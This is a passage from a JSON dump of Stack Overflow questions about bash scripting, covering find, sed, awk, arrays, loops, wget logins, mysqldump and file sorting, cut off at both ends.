like:</p>\n\n<pre><code>.\n./lab2.sh~\n./#zad2.sh#\n./zad2.sh~\n./zad1a.sh\n./zad2.sh\n./lab2.sh\n./Azad2.sh~\n./cdlinux.ftp.log\n./Azad2.sh\n./zad1a.sh~\n./zad1.sh\n./cdlinux.www.log\n./zad1.sh~\nzad1a.sh\nzad1a.sh~\nzad1.sh\nzad1.sh~\nzad2.sh\nzad2.sh~\n</code></pre>\n\n<p>Why does it list all files in my folder (with <code>./</code> before file name), and after that I get proper find results. Is there any way to remove that <code>./</code> output? Using sed command won't work in all cases (when search path would be different than <code>.</code>).</p>\n"},{"tags":["bash","networking"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13098634,"title":"How should I export http_proxy variable?","body":"<p>I'm trying to write a simple script that will set proxy settings. Actually I just need to export <code>http_proxy ftp_proxy https_proxy ...</code> variables with <code>export</code> command.\nBut it's not working when I run it manually from the shell because <code>export</code> affect only current shell and subshells, but no others. Also I don't want to call it from <code>.bashrc</code> because it's not my default proxy settings.</p>\n\n<p>So how should I export <code>http_proxy</code> variable to make effect globally?</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13100216,"title":"bash script that get first 5 lines and put in another file","body":"<p>hi all i need to write a simple bash script that lists all PHP files in a directory and writes the first 5 lines of each PHP-file to new file called : PHP_header</p>\n\n<p>i know only the basic in linux command line </p>\n\n<pre><code>#!/bin/bash\n    grep –r stringsearch\n    find /opt/-name ‘log_*’\n    du –s foldername\n    head -10 filename\n    mkdir filername.php\n</code></pre>\n\n<p>please explain me how can i complet this </p>\n"},{"tags":["bash","environment-variables","interpreter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13100226,"title":"environment variable expansion in first line of shell script","body":"<p>My ruby shell scripts specify the ruby interpreter in the first line of the script as:</p>\n\n<pre><code>#!/Users/me/.rvm/rubies/ruby-1.9.3-p194/bin/ruby\n</code></pre>\n\n<p>The problem is that when I upgrade to a new ruby version, I have to edit all the script files to update the interpreter. There is an environment variable available, $MY_RUBY_HOME, that expands to the current path (minus the /bin/ruby part). However, all my attempts to use:</p>\n\n<pre><code>#!{$MY_RUBY_HOME}/bin/ruby\n#!${MY_RUBY_HOME}/bin/ruby\netc\n</code></pre>\n\n<p>fail (\"bad interpreter: No such file or directory\"). I suspect environment expansion isn't done on the first line, so I may just be out of luck. I would be interested if anybody has been able to use environment variable expansion on the program definition line in a shell script.</p>\n"},{"tags":["bash","if-statement","solaris"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13098805,"title":"Bash If Else for login -p","body":"<p>the command logins -p is to show which users do not have a password while wc -l is to count the number of newlines. Thus, logins -p | wc -l shows the number of users that do not have a password. In my case, logins -p | wc  -l returns me a value of 4 but when I compare it to be equal to 0, it prints \"equal to 0\" which is wrong. I would like to ask if there are any mistakes in my script and does wc -l returns an INT? Thanks.</p>\n\n<pre><code>if [ \"$(logins -p | wc -l)\" -eq 0 ]; then\n  echo \"equal to 0\"\nelse \n  echo \"not equal to 0\"\nfi\n</code></pre>\n"},{"tags":["bash","sorting","edit"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13096768,"title":"How can I switch around the content of a line of text","body":"<p>I have a large file (around 39,000 lines of text) that consists of the following:</p>\n\n<pre><code>1:iowemiowe093j4384d\n2:98j238d92dd2d\n3:98h2d078h78dbe0c\n(continues in the same manner)\n</code></pre>\n\n<p>and I need to reverse the order of the two sections of the lines, so the output would be:</p>\n\n<pre><code>iowemiowe093j4384d:1\n98j238d92dd2d:2\n98h2d078h78dbe0c:3\n</code></pre>\n\n<p>Instead, I've tried using cut to do this but have not been able to get it to behave properly (this is in a bash environment), what would be the best way to do this?</p>\n"},{"tags":["linux","bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13064676,"title":"BASH Command Not Found","body":"<p>I'm trying to count the number of HDD's on my linux system, I have put together the following line.</p>\n\n<pre><code>findhdds=$(find /sys/block -name 'sd*' | wc -l)\n</code></pre>\n\n<p>Now it seems to work when just running 'find /sys/block -name 'sd*' | wc -l' but when trying to store it in a variable I get the following message when reading it back:</p>\n\n<pre><code>3: command not found\n</code></pre>\n\n<p>Anyone understand where I have gone wrong? </p>\n"},{"tags":["linux","bash","gstreamer","vlc"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":153,"score":1,"question_id":9849149,"title":"How to queue up a set of raw audio files from bash","body":"<p>I am using a system that is pushing out raw audio files in the tmp directory that I want to play.  My Linux distro has some bug that causes a pause for two seconds every time you play some audio with a utility (eg mplayer, sox, etc).  As a workaround, I want to continuously play the audio files without this pause.</p>\n\n<p>I have very little control over the system.  The system will be up whenever the computer is on but files will come through in bursts.  The system creates the files, runs a script that you specify and then deletes the file.  I could move the file, convert it, whatever, but I want it to be simple and elegant.  I'm thinking there would be some way to push the files into a queue that will play the file without closing the session to the sound card so I don't get that annoying delay.</p>\n\n<p>I'm thinking something like GStreamer or VLC could work.  Any suggestions?</p>\n\n<p>Update:  If you vote to close this question, please tell me exactly why.  THIS IS A PROGRAMMING QUESTION for the bash programming language..plain and simple.</p>\n"},{"tags":["bash","command-line","text-processing"],"answer_count":8,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":4726,"score":5,"question_id":415677,"title":"How to replace ${} placeholders in a text file?","body":"<p>I want to pipe the output of a \"template\" file into MySQL, the file having variables like <code>${dbName}</code> interspersed. What is the commandline utility to replace these instances and dump the output to standard output?</p>\n"},{"tags":["bash","loops","inotify"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":-1,"question_id":13097606,"title":"whats the correct way to loop this","body":"<p>I have a script where inotifywait is piped into a while loop that executes the following logic.</p>\n\n<pre><code>     cp \"$S3\"/2/post2.png \"$S3\";\n     mv \"$S3\"/1/post1.png \"$S3\"/2/post2.png;\n     cp \"$S3\"/3/post3.png \"$S3\";\n     mv \"S3\"/post2.png \"$S3\"/3/post3.png;\n</code></pre>\n\n<p>so forth and so on..... then at the end of the script...</p>\n\n<pre><code>     mv \"$dir\"/$file \"$S3\"/1/post1.png\n</code></pre>\n\n<p>That line represents a fresh post, the above is the rotation of older post.</p>\n\n<p>I can can hand code the iterations all the way down to 100+, but I would like to program more efficiently and save time. </p>\n\n<p>So, what's some correct ways to loop this?</p>\n"},{"tags":["linux","bash","awk"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13094380,"title":"splitting folder names with awk in a directory","body":"<p>There are some directories in the working directory with this template</p>\n\n<pre><code>cas-2-32\nsat-4-64  \n...\n</code></pre>\n\n<p>I want to loop over the directory names and  grab the second and third part of folder names. I have wrote this script. The body shows what I want to do. But the awk command seems to be wrong</p>\n\n<pre><code>#!/bin/bash\nfor file in `ls`; do\n  if [  -d $file ]; then \n    arg2=`awk -F \"-\" '{print $2}' $file`\n    echo $arg2\n    arg3=`awk -F \"-\" '{print $3}' $file`\n    echo $arg3\n  fi\ndone\n</code></pre>\n\n<p>but it says</p>\n\n<pre><code> awk: cmd. line:1: fatal: cannot open file `cas-2-32' for reading (Invalid argument)\n</code></pre>\n"},{"tags":["bash","shell","script","while-loop"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":13096331,"title":"write output to multiple files in shell","body":"<p>I have 135 documents stored as 135 lines (So each line is a long text) in File_A and I have 15 phrases in File_B. I need to extract a sentence and its before from File_A with a matching phrase in File_B. The extracted sentences from File_A-Line_1 should be output to a new file File_1. Similarly the extracted sentences from File_A-Line_2 should be output to a new file File_2 and so on till i extract matching sentences from all the lines. I did this with the following code </p>\n\n<pre><code>i=1\nwhile read line; do\n while read row; do\n   cat \"$line\" | sed 's/\\./.\\n/g' | grep -i -B 1 \"$row\"  | tr -d '\\n' |  sed 's/--/\\n/g'    &gt;&gt; file_$i\n done &lt; $2 \n $i = $i+1;\ndone &lt; $1\n</code></pre>\n\n<p>The problem here is, the output is being printed on to the console but not to the new file. Could some one help me in realizing my error.</p>\n\n<p>Thank you  </p>\n"},{"tags":["bash","compare","tar","gz"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13095893,"title":"bash compare two tar.gz","body":"<p>I need to compare two archives tar.gz, without unpacking them, listing file names from the 1st arch that aren't in the 2nd arch.</p>\n\n<p>I've tried a few ways but every one has failed. I'm new to bash.</p>\n"},{"tags":["linux","bash","scripting"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":13043895,"title":"Editing every file in a directory after opening it bash","body":"<p>Looking around I didn't see exactly what I was looking for. Some similar stuff, but for some reason what I tried so far hasn't worked.</p>\n\n<p>My main goals:</p>\n\n<ol>\n<li>run script in a my current directory</li>\n<li>open the picture to see what it is</li>\n<li>rename the picture i just viewed</li>\n<li>repeat the process without running the script again</li>\n</ol>\n\n<hr>\n\n<p>These were the sources I attempted to follow:</p>\n\n<p><a href=\"http://www.cyberciti.biz/faq/bash-loop-over-file/\" rel=\"nofollow\">Bash Shell Loop Over Set of Files</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/8131146/bash-loop-through-directory-and-rename-every-file\">Bash loop through directory and rename every file</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/1310422/how-to-do-something-to-every-file-in-a-directory-using-bash\">How to do something to every file in a directory using bash?</a></p>\n\n<p>==================================================================================</p>\n\n<pre><code>echo \"Rename pictures. Path\"\nread path\nfor f in $path\ndo  \n    eog $path\n    echo \"new name\"\n    read newname\n    mv $path $newname\n    cat $f\ndone\n</code></pre>\n"},{"tags":["perl","bash","shell","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":13093709,"title":"How to use shell variables in perl command call in a bash shell script?","body":"<p>How to use shell variables in perl command call in a bash shell script?</p>\n\n<p>I have a perl command in my shell script to evaluate date -1.</p>\n\n<p>How can i use $myDate in perl command call?</p>\n\n<p>This is the section in my script: </p>\n\n<pre><code>myDate='10/10/2012'\n\nDt=$(perl -e 'use POSIX;print strftime '%m/%d/%y', localtime time-86400;\")\n</code></pre>\n\n<p>I wana use $myDate in place of '%m/%d/%y'</p>\n\n<p>Any help will be appriciated.</p>\n\n<p>Thank you.</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":13094165,"title":"printing folder names in bash","body":"<p>This piece of bash code, shows no folder name while there exists many folders.</p>\n\n<pre><code>#!/bin/bash\n\nfor file in .; do\n  if [  -d $file ]; then \n    echo $file\n  fi\ndone\n</code></pre>\n\n<p>the output is only <code>.</code>\nCan you explain why?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13091700,"title":"Why is my array gone after exiting loop?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/11656013/bash-cant-build-array-in-right-side-of-pipe\">Bash: can’t build array in right side of pipe</a>  </p>\n</blockquote>\n\n\n\n<p>I need to create an array from a file. I have to calculate an index where to store data. When I get outside my read loop, my arrays seems to be gone. Why???</p>\n\n<p>The script below illustrates the problem.</p>\n\n<pre><code>#!/bin/bash\n\necho -e \"15\\n21\\n33\" | while read i ; do\n    ar[$i]=\"set\"\n    echo ${!ar[@]}\n    echo ${ar[@]}\n  done\n\necho\necho outside loop:  \necho ${!ar[@]} \necho ${ar[@]} \n</code></pre>\n\n<p>As you can see in the output, printing the array indexes and content no longer work outside of loop.</p>\n\n<pre><code>15\nset\n15 21\nset set\n15 21 33\nset set set\n\noutside loop:\n</code></pre>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13092360,"title":"How to remove extra spaces in bash?","body":"<p>How to remove extra spaces in variable HEAD?</p>\n\n<pre><code>HEAD=\"    how to  remove    extra        spaces                     \"\n</code></pre>\n\n<p>result: how to remove extra spaces</p>\n\n<p>thank you</p>\n"},{"tags":["bash","wildcard"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13092931,"title":"Reuse wildcard match in bash","body":"<p>I want to do something like this in bash:</p>\n\n<pre><code>scp me@server:/data/stuff/*/needthis.txt ./?/needthis.txt\n</code></pre>\n\n<p>Where that ? in the command will be whatever was matched by the *. </p>\n\n<p>My problem is there's a bunch of directories out of which I want to copy one file that's the same name in each directory, and I want to preserve the name of the directory they came from, but I don't just want to copy the entire \"stuff\" folder because there are other files in these directories that are hundreds of MB which I don't want to waste time downloading.</p>\n\n<p>Can I do this easily?</p>\n"},{"tags":["string","bash","variables"],"answer_count":29,"favorite_count":15,"up_vote_count":73,"down_vote_count":0,"view_count":122630,"score":73,"question_id":369758,"title":"How to trim whitespace from bash variable?","body":"<p>I have a shell script with this code:</p>\n\n<pre><code>var=`hg st -R \"$path\"`\nif [ -n \"$var\" ]; then\n    echo $var\nfi\n</code></pre>\n\n<p>But the conditional code always executes because <code>hg st</code> always prints at least one newline character.</p>\n\n<ul>\n<li>Is there a simple way to strip whitespace from <code>$var</code> (like <code>trim()</code> in php)?</li>\n</ul>\n\n<p>or</p>\n\n<ul>\n<li>Is there a standard way of dealing with this issue?</li>\n</ul>\n\n<p>I could use <code>sed</code> or <code>awk</code>, but I'd like to think there is a more elegant solution to this problem.</p>\n"},{"tags":["bash","sed"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":995,"score":5,"question_id":8206280,"title":"Delete all lines beginning with a # from a file","body":"<p>All of the lines with comments in a file begin with <code>#</code>. How can I delete all of the lines (and only those lines) which begin with <code>#</code>? Other lines containing <code>#</code>, but not at the beginning of the line should be ignored.</p>\n"},{"tags":["bash","shell","sass","nohup"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13093133,"title":"Error when running nohup in bash script","body":"<p>My bash/nohup experience is very limited, so I might be making a basic mistake. </p>\n\n<p>I'm launching a background file monitor. (In case it matters, Sass is a CSS preprocessor that can monitor source files and automatically compile them into CSS when it detects changes.) </p>\n\n<p>When I enter this at a shell prompt, it launches the Sass file monitor perfectly:</p>\n\n<pre><code>nohup sass --watch /data/sass/:/data/css/ &gt; /var/log/sass.out 2&gt; /var/log/sass.err &amp;\n</code></pre>\n\n<p>But when I put it in a script like this (a simplified sample script for debugging):</p>\n\n<pre><code>COMMAND=\"[exactly the same command as above]\"\necho `$COMMAND`\n</code></pre>\n\n<p>I get this error:</p>\n\n<pre><code>nohup: ignoring input and redirecting stderr to stdout\nErrno::ENOENT: No such file or directory - &gt; Use --trace for backtrace. &gt;&gt;&gt; \nSass is watching for changes. Press Ctrl-C to stop.\n</code></pre>\n\n<p>The same thing happens if I specify the full path /usr/bin/local/sass. Any idea where I'm going wrong?</p>\n"},{"tags":["bash","shell","hashtable","associative-array"],"answer_count":11,"favorite_count":15,"up_vote_count":30,"down_vote_count":0,"view_count":30338,"score":30,"question_id":688849,"title":"Associative arrays in Shell scripts","body":"<p>We required a script that simulates Associative arrays or Map like data structure for Shell Scripting, any body?</p>\n"},{"tags":["bash","search","copy","find","cp"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13092156,"title":"Bash search and copy using variables","body":"<p>I have a set of directories that I wish to search, ie</p>\n\n<pre><code>/home/*/Documents/Crashes\n</code></pre>\n\n<p>The files that I am trying to pull are of the form:</p>\n\n<p><code>A.log.20121022T160949Z</code>, where the first several numbers are the date (here 2012/10/22). </p>\n\n<p>I have a text file that I pull from with usernames, read in as $line.</p>\n\n<p>I only want to pull files from the current date. I've tried:</p>\n\n<pre><code>D= date +%Y%m%d%t\ncp -ru /home/$line/Documents/Crashes/A.log.$D* /home/$USER/Documents/Todayslogs\n</code></pre>\n\n<p>and it pulls everything. Also tried find with no luck...</p>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13092057,"title":"Why doesn't my bash script allow me to enter the python shell?","body":"<p>I wrote a super simple bash script to get me into a python shell with everything set up like I need but it never actually enters the python shell. What am I doing wrong?</p>\n\n<pre><code>sudo su runnerdude\n. /home/runnerdude/foo/env/bin/activate\ncd /home/runnerdude/foo/bar\npython manage.py shell\n</code></pre>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13091295,"title":"Bash to get timestamp from file list and compare it to filename","body":"<p>Implementing a GIT repository for a project we are including the DB structure by generating a dump on the post-commit hook on deployment.</p>\n\n<p>What I would like to have is a simple versioning system for the file based on the timestamp of the last change to the tables structure.</p>\n\n<p>After finding <a href=\"http://daryl.learnhouston.com/2006/11/30/when-did-i-change-my-mysql-database-structure/\" rel=\"nofollow\">this post</a> with the suggestion to check for the dates of the the *.frm files in the MySQL data dir I thought the solution would be to implement it based on that last date as part of the generated file. This is:</p>\n\n<ol>\n<li><p>Find out the latest date-time of the files of the DB (i.e. /var/lib/mysql/databaseX/) via an ls command (of type ls -la *.frm)</p></li>\n<li><p>compare that value (last changed file) with the one of a certain file (ie /project/dump_2012102620001.sql) where the numbers correspond to the last generated dump.</p></li>\n<li><p>If files timestamp is after that date generate the mysqldump command, otherwise ignore so the dump does not get generated and\ncommitted as a change to GIT</p></li>\n</ol>\n\n<p>Unfortunately my Linux console/bash concepts are too far from being capable and have not found any similar script to use.</p>\n"},{"tags":["linux","bash","shell","unix","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13090875,"title":"How can i append files to one another in the order i want in linux using pipes or redirects?","body":"<p>Lets say i have different files in a folder that contains the same day data such as :</p>\n\n<pre><code>ThisFile_2012-10-01.txt\nThatFile_2012-10-01.txt\nAnotherSilly_2012-10-01.txt\nInnovativeFilesEH_2012-10-01.txt\n</code></pre>\n\n<p>How to i append them to each other in any preferred order? Would below be the exact way i need to type in my shellscript? The folder gets same files everyday but with different dates. Old dates disappear so every day there are these 4 files.</p>\n\n<pre><code>InnovativeFilesEH_*.txt &gt;&gt; ThatFile_*.txt\nThisFile_*.txt &gt;&gt; ThatFile_*.txt\nAnotherSilly_*.txt &gt;&gt; ThatFile_*.txt\n</code></pre>\n"},{"tags":["file","bash","sorting","debian"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13091094,"title":"How can I sort the contents of one file, based on the contents of another file","body":"<p>I have two files, one with content similar to the following:</p>\n\n<pre><code>1.something344343\n2.something2dsdsf\n4.somethingdsddfsd\n5.something920j329\n</code></pre>\n\n<p>and the second file would be along the lines of:</p>\n\n<pre><code>1.somethingwoimewoiew\n3.something9jwe90jew\n7.something90kjwe90ewk\n</code></pre>\n\n<p>in essence, the first file has more numbered lines then the second one does, the first file goes up to around 39,000 lines, while the second file only goes up to 23,000 lines. Having said that, would anyone know how I could seperate the first file into line numbers (number prefacing the colon) that were included in file 2, and lines that were not included in file 2 (this would be in a bash environment). the end result would be something along the lines of this:</p>\n\n<pre><code>lines included in second file:\n1.something344343\n\nlines not included in second file:\n2.something2dsdsf\n4.somethingdsddfsd\n5.something920j329\n</code></pre>\n\n<p>I've thought over different methods that I could use to do this, but unfortunately have not been able to come up with any effective solutions yet, if anyone could help out with this though I would really appreciate it, thanks!</p>\n"},{"tags":["regex","bash","grep"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13090230,"title":"Making a mistake with | (or) in regular expressions","body":"<p>I'm sure I'm doing something really obviously wrong here, but I can't figure out what. Using grep from a bash shell, I have a file test.txt:</p>\n\n<pre><code>ABC123\nABC456\nABC789\nDEF123\nDEF456\nDEF789\n</code></pre>\n\n<p>Now at the command line:</p>\n\n<pre><code>$ grep ABC test2.txt\nABC123\nABC456\nABC789\n\n$ grep DEF test2.txt\nDEF123\nDEF456\nDEF789\n</code></pre>\n\n<p>So those work great. Now, I expect the following command to print the whole file, but:</p>\n\n<pre><code>$ grep ABC\\|DEF test2.txt\n\n$ grep (ABC)\\|(DEF) test2.txt\n-bash: syntax error near unexpected token `ABC'\n\n$ grep \\(ABC\\)\\|\\(DEF\\) test2.txt\n\n$ grep 'ABC|DEF' test2.txt\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["bash","shell","install","ack"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":73,"score":3,"question_id":12885417,"title":"Unfamiliar shell syntax in ack-grep install script","body":"<p>From the ack installation page (http://betterthangrep.com/install/) there is a one-liner installation with curl:</p>\n\n<pre><code>curl http://betterthangrep.com/ack-standalone &gt; ~/bin/ack &amp;&amp; chmod 0755 !#:3\n</code></pre>\n\n<p>I understand that it's getting the file from the website and saving it to ~/bin/ack, then setting permissions, but what does that last part ( !#:3 ) do ? (I do not recognize the syntax and Googling didn't yield any helpful results)</p>\n"},{"tags":["bash","for-loop"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13085929,"title":"Bash - for-loop for every folder in a directory, excluding some of them","body":"<p>Thank you very much in advance for helping!</p>\n\n<p>I have this code in bash:</p>\n\n<pre><code>for d in this_folder/*    \n    do    \n        plugin=$(basename $d)\n        echo $plugin'?'\n        read $plugin\n    done\n</code></pre>\n\n<p>Which works like a charm. For every folders inside 'this_folder', echo it as a question and store the input into a variable with the same name. </p>\n\n<p>But now I'd like to exclude some folders, so for example, it will ask for every folder in that directory, ONLY if they are NOT any of the following folders: global, plugins, and css.</p>\n\n<p>Any ideas how can I achieve this?</p>\n\n<p>Thanks!</p>\n\n<p>UPDATE:</p>\n\n<p>This is how the final code looks like:</p>\n\n<pre><code>base=\"coordfinder|editor_and_options|global|gyro|movecamera|orientation|sa\"\n\n&gt; vt_conf.sh\necho \"# ========== Base\"     &gt;&gt; vt_conf.sh\nfor d in $orig_include/@($base)\ndo\n    plugin=$(basename $d)\n    echo \"$plugin=y\"         &gt;&gt; vt_conf.sh\ndone\necho ''                      &gt;&gt; vt_conf.sh\necho \"# ========== Optional\" &gt;&gt; vt_conf.sh\nfor d in $orig_include/!($base)\ndo\n    plugin=$(basename $d)\n    echo \"$plugin=n\"         &gt;&gt; vt_conf.sh\ndone\n</code></pre>\n"},{"tags":["bash","shell","backup"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":33,"score":3,"question_id":13087488,"title":"repeat command for every argument in variable","body":"<pre><code>#!/bin/sh\ndblist=mail ftp www\nfor arg in $dblist; do\nmysqldump -u dumper --password=$dbpass --socket $socket --database $dblist &gt;&gt; /tmp/backup/$dblist.sql\ndone\n</code></pre>\n\n<p>Every database from variable dblist should write a new mysqldump line and add the database names into the according fields, how can this be achieved?</p>\n"},{"tags":["bash","shell","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13089564,"title":"'sed' is not replacing matching sequence in file","body":"<p>I have input like this in a specific file</p>\n\n<pre><code>#- seeds: \"12.123.233.213,123.231.3.2\"\n    - seeds: \"12.12.21.21,43.435.54.54\"\n</code></pre>\n\n<p>As you see that the seeds contains two consecutive IP addresses, so I want to change that IP address in the file. 1st line will not be considered as it starts with \"#\"</p>\n\n<p>So for doing this, I have this:</p>\n\n<pre><code>val=' - seeds: \"'\n\nnewSeed=${val}${ip1}','${ip2}'\"'     # ---&gt; I'm creating the new seed\nstr=`grep \"\\s- seed\" $file`          # ---&gt; finding matching character\necho $str                            # ---&gt; it does print out the 2nd line\nsed -i 's|${str}|${newSeed}|g' $file # --&gt; now replace the matched string with new seed value\n</code></pre>\n\n<p>But it doesn't replace the value in the file. What I'm doing wrong here? </p>\n"},{"tags":["linux","bash","shell"],"answer_count":17,"favorite_count":23,"up_vote_count":54,"down_vote_count":0,"view_count":51704,"score":54,"question_id":806906,"title":"How do I test if a variable is a number in bash?","body":"<p>I just can't figure out how do I make sure an argument passed to my script is a number or not.</p>\n\n<p>All I want to do is something like this:</p>\n\n<pre><code>test *isnumber* $1 &amp;&amp; VAR=$1 || echo \"need a number\"\n</code></pre>\n\n<p>Any help?</p>\n\n<p>UPDATE:\nI managed (whit <a href=\"http://stackoverflow.com/questions/806906/how-do-i-test-if-a-variable-is-a-number-in-bash/806923#806923\">Charles' help</a>) to do it, but I'm not yet sure it's the best way to do that (even though it worked on my tests). This is how it ended up:</p>\n\n<pre><code>[[ $1 =~ \"^[0-9]+$\" ]] &amp;&amp; echo \"number\" &amp;&amp; exit 0 || echo \"not a number\" &amp;&amp; exit 1\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13087099,"title":"Determining whether a value exists in an array","body":"<p>Thank you very much for helping!!!</p>\n\n<p>I have the following code:</p>\n\n<pre><code>base[0]='coordfinder'\nbase[1]='editor_and_options'\nbase[2]='global'\nbase[3]='gyro'\nbase[4]='movecamera'\nbase[5]='orientation'\nbase[6]='sa'\n\nfor d in $dest_include/*; do\n    if [ $d == \"${base[@]}\" ]; then\n        echo $plugin='y' &gt;&gt; vt_conf.sh\n    else\n        plugin=$(basename $d)\n        echo $plugin'?'\n        read $plugin\n        echo $plugin=${!plugin} &gt;&gt; vt_conf.sh\n    fi\ndone\n</code></pre>\n\n<p>It doesn't work, but it's a good starting point.\nBasically the thing that doesn't work is the if loop. I just made it up because I don't know how to do it.</p>\n\n<p>I'd like to do the following:</p>\n\n<p>Loop through the content of $dest_include folder.\nIf any of the forlders ($d) matches any of the elements in the array do one thing, else do something else.</p>\n\n<p>Thanks!!!</p>\n"},{"tags":["linux","bash","unix","sorting","script"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13088370,"title":"Sort numerically","body":"<p>Here is a list of files:</p>\n\n<pre><code>some.string_100_with_numbers.in-it.txt\nsome.string_101_with_numbers.in-it.txt\nsome.string_102_with_numbers.in-it.txt\nsome.string_23_with_numbers.in-it.txt\nsome.string_24_with_numbers.in-it.txt\nsome.string_25_with_numbers.in-it.txt\n</code></pre>\n\n<p>Now I would like to sort it numerically. Starting with *23* and ending with *102*.</p>\n\n<p>I have tried <code>-n</code> and <code>-g</code>. <code>-t</code> does not help in these messy strings. </p>\n\n<p>Can I ignore leading strings to the number with an option or do I have to be clever and script?</p>\n"},{"tags":["bash","shell","exec"],"answer_count":4,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":6132,"score":7,"question_id":1216922,"title":"sh command: exec 2>&1","body":"<p>What will this command do? </p>\n\n<pre><code>exec 2&gt;&amp;1\n</code></pre>\n"},{"tags":["bash","date","timestamp"],"answer_count":7,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":3534,"score":6,"question_id":2371248,"title":"How to convert timestamps to dates in bash?","body":"<p>I need a shell command or script that converts a UNIX timestamp to a date. The input can come either from the first parameter or from stdin, allowing for the following usage patterns:</p>\n\n<pre><code>ts2date 1267619929\n</code></pre>\n\n<p>and</p>\n\n<pre><code>echo 1267619929 | ts2date\n</code></pre>\n\n<p>Both commands should output \"Wed Mar  3 13:38:49 2010\".</p>\n"},{"tags":["bash","unix","loops","execute"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13078957,"title":"Unix - Executing same command on same file in multiple sub directories","body":"<p>I have 36 subdirectories in the same directory named <code>10,11,12,....45</code></p>\n\n<p>In each subdirectory there is a file named <code>pressure.sh</code> that I would like to execute a command on, the command is <code>qsub</code></p>\n\n<p>I was wondering if there was a way where I could execute the command qsub on each <code>pressure.sh</code> file in each subdirectory 10-45 from the parent directory?</p>\n\n<p>So I am looking for a code that executes \"<code>qsub pressure.sh</code>\" one by one in each subdirectory so I do not have to do it one by one every time. </p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["bash","absolute-path"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":478,"score":1,"question_id":7126580,"title":"expand a possible relative path in bash","body":"<p>As arguments to my script there are some file paths, those can ofcpirse be relative (or contain ~). But for the functions I've written I need paths that are absolute, but do not have their symlinks resolved.</p>\n\n<p>Is their any function for this?</p>\n"},{"tags":["java","bash","parsing"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":46,"score":-1,"question_id":13087031,"title":"Similar code in java","body":"<p>I'm using a shell-script to can login in a webpage for parser the content.\nI'm using the code in bash:</p>\n\n<pre><code>wget --save-cookies=cookies.txt --post-data \"uid=yyyyy&amp;pass=xxxxx\" http://www.spanishtracker.com/login.php\n\nwget --load-cookies=cookies.txt \"http://www.spanishtracker.com/torrents.php\"  -O outpout\n</code></pre>\n\n<p>Could you help me to make these with java code?\nMany thanks and sorry for my 